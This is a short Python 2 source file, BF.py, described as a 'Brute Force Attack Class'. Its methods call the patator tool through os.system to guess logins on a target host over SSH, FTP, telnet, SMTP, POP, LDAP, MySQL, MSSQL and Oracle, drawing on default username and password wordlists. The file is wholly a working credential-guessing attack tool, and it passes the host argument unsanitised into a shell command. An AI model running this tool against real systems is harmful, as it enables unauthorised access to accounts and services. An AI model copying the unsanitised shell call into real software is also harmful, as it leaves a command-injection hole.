#Programmer: Brent E. Chambers
#Date: 6/20/2016
#filename: BF.py
#Description:  Brute Force Attack Class to conduct attacks

userfile = '/usr/share/wordlists/default_users_short.txt'
passfile = '/usr/share/wordlists/default_pass_short.txt'

import os


class Brute:

	def __init__(self):
		pass

	def bf_ssh(self, host):
		print 'patator ssh_login host=NET0 user='+userfile+' password='+passfile + ' 0='+host
		os.system('patator ssh_login host=NET0 user='+userfile+' password='+passfile + ' 0='+host)

	def bf_ftp(self, host):
		os.system('patator ftp_login host=NET0 user='+userfile+' password='+passfile + ' 0='+host)

	def bf_telnet(self, host):
		os.system('patator telnet_login host=NET0 user='+userfile+' password='+passfile + ' 0='+host)

	def bf_smtp(self, host):
                os.system('patator smtp_login host=NET0 user='+userfile+' password='+passfile + ' 0='+host)

	def bf_pop(self, host):
                os.system('patator pop_login host=NET0 user='+userfile+' password='+passfile + ' 0='+host)

	def bf_ldap(self, host):
                os.system('patator ldap_login host=NET0 user='+userfile+' password='+passfile + ' 0='+host)

	def bf_mysql(self, host):
                os.system('patator mysql_login host=NET0 user='+userfile+' password='+passfile + ' 0='+host)

	def bf_mssql(self, host):
                os.system('patator mssql_login host=NET0 user='+userfile+' password='+passfile + ' 0='+host)

	def bf_oracle(self, host):
                os.system('patator oracle_login host=NET0 user='+userfile+' password='+passfile + ' 0='+host)
